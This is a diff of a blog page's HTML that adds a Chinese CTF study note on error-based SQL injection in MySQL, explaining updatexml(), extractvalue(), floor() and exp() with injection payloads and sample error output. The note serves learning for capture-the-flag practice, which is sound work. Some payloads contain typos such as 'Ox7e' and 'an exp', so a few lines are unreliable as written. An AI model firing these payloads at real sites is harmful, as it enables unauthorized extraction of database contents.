@@ -22,7 +22,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>Sayingの魔法书</title>
+  <title>报错注入 - Sayingの魔法书</title>
+  
+    <meta name="keywords" content="CTF-web,SQL注入">
   
 
   
@@ -351,7 +353,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper list featured' style="display: none;">
+        <div id="full" class='cover-wrapper post featured' style="display: none;">
           
             <div id='cover-backstretch'></div>
           
@@ -414,42 +416,253 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper" id="pjax-container">
           
 
-
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
-    <section class="post-list">
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-    </section>
+
+
   
+    <div class='headimg-div'>
+      <a class='headimg-a'>
+        <img class='headimg' src='https://gitee.com/saying_yy/blog-image/raw/master/img/20210606143141.png'/>
+      </a>
+    </div>
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        报错注入
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/CTF-web/">CTF-web</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Jul 10, 2020</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="报错注入" data-path="/2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>之前都是做题中积累经验，感觉自己的基础薄弱。大部分时候都是看别人的WP才能做题。最近在看一本《CTF训练营》，补一补基础，做笔记。</p>
+<h2 id="报错注入的条件"><a href="#报错注入的条件" class="headerlink" title="报错注入的条件"></a>报错注入的条件</h2><ul>
+<li>可回显</li>
+<li>回显有报错信息</li>
+<li>过滤不严格（希望WAF不行）</li>
+</ul>
+<p>绕过是个麻烦事儿，这里暂且假设没有任何过滤。</p>
+<h2 id="报错注入使用的函数"><a href="#报错注入使用的函数" class="headerlink" title="报错注入使用的函数"></a>报错注入使用的函数</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document，String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br></pre></td></tr></table></figure>
+
+<p>updatexml()的第二个参数为Xpath格式的字符串，当其不属于Xpath语法时就会报错，<strong>报错内容显示</strong>出该参数不符合Xpath语法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT updatexml(1, concat(Ox7e,(SELECT version()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY00O): XPATH syntax error: &#x27; -5.6.26~ &#x27;            #成功爆出数据库版本</span><br></pre></td></tr></table></figure>
+
+<p>于是，通过改变updatexml()的第二个参数，可以执行SQL语句查数据库、查表、等等。</p>
+<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE (XML_document, XPath_string); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br></pre></td></tr></table></figure>
+
+<p>extractvalue()从XML中返回包含查询值的字符串。通过extractvalue()实现报错注入的原理与updatexml()十分类似。都是通过参数不符合Xpath的语法，实现报错注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT 1,2 and extractvalue(1,concat(Ox7e,(SELECT version()),0x7e));</span><br><span class="line">ERROR 1105 (HY00O): XPATH syntax error: &#x27; -5.6.26~ &#x27;           #成功爆出数据库版本</span><br></pre></td></tr></table></figure>
+
+<h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>floor()函数只有一个参数。</p>
+<p>floor函数的作用是返回小于等于该值的最大整数，即向下取整，只保留整数部分。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_ schema.tables limit 0,1),floor(rand(0)*2))x from information_ schema.tables group by x)a)%23</span><br><span class="line"></span><br><span class="line">#来源于《CTF训练营》</span><br></pre></td></tr></table></figure>
+
+<p>可爆出数据库版本。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h3><p>exp()函数只有一个参数。</p>
+<p>此函数返回e(自然对数的底)指数X的幂值。但是当传递的参数大于709时，就会发生溢出错误。</p>
+<p>正确执行函数返回0，对0按位取反可以得到很大的数“18446744073709551615”，故可以构造注入语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; an exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)); </span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41594045/article/details/83547103">SQL注入 | exp()函数报错</a></p>
+<p>《CTF训练营》</p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://example.com/2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/>http://example.com/2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-06-06T14:31:52+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Jun 6, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF-web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF-web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>SQL注入</p></a></div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/&title=报错注入 - Sayingの魔法书&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/&title=报错注入 - Sayingの魔法书&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/&title=报错注入 - Sayingの魔法书&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>flask模板注入</p>
+          <p class='content'>Flask模板注入（一）Flask中使用了Jinja2作为模板渲染引擎，Jinja2会将{{}}中包裹的内容当作变量解析替换。当服务器接受了用户的输入并将其作为模板的一部分，在渲染的过程中就可能...</p>
+        </a>
+      
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+  </article>
+
+
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -457,141 +670,28 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://gitee.com/saying_yy/blog-image/raw/master/img/2.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>Saying</h2>
-        
-        
-          <p>一只蒻苟</p>
 
-        
-        
-          <p><span id="jinrishici-sentence">Sayingの魔法书</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/1396318209@qq.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/saying-yan"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
-
-  
-    
-    
-  
-
-  <section class="widget category shadow desktop">
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
   <header>
     
-      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
     
   </header>
 
 
     <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/CTF-web/" href="/categories/CTF-web/"
-            id="categoriesCTF-web"
-            ><div class='name'>CTF-web</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/Dian/" href="/categories/Dian/"
-            id="categoriesDian"
-            ><div class='name'>Dian</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/misc/" href="/categories/misc/"
-            id="categoriesmisc"
-            ><div class='name'>misc</div><div class='badge'>(1)</div></a></li>
-        
-      </ul>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-text">报错注入的条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">报错注入使用的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml"><span class="toc-text">updatexml()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-text">extractvalue()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#floor"><span class="toc-text">floor()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
     </div>
   </section>
 
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/C/" style="font-size: 14px; color: #999">C</a> <a href="/tags/CTF/" style="font-size: 14px; color: #999">CTF</a> <a href="/tags/CTF-web/" style="font-size: 19px; color: #777">CTF-web</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 14px; color: #999">SSTI</a> <a href="/tags/linux/" style="font-size: 14px; color: #999">linux</a> <a href="/tags/php/" style="font-size: 14px; color: #999">php</a> <a href="/tags/python/" style="font-size: 24px; color: #555">python</a> <a href="/tags/unicode/" style="font-size: 14px; color: #999">unicode</a> <a href="/tags/%E5%97%85%E6%8E%A2/" style="font-size: 14px; color: #999">嗅探</a> <a href="/tags/%E9%87%8D%E5%AE%9A%E5%90%91/" style="font-size: 14px; color: #999">重定向</a>
-    </div>
-  </section>
-
-
-  
 
   
 
 
 </aside>
+
 
 
 		  
@@ -600,8 +700,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="报错注入";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
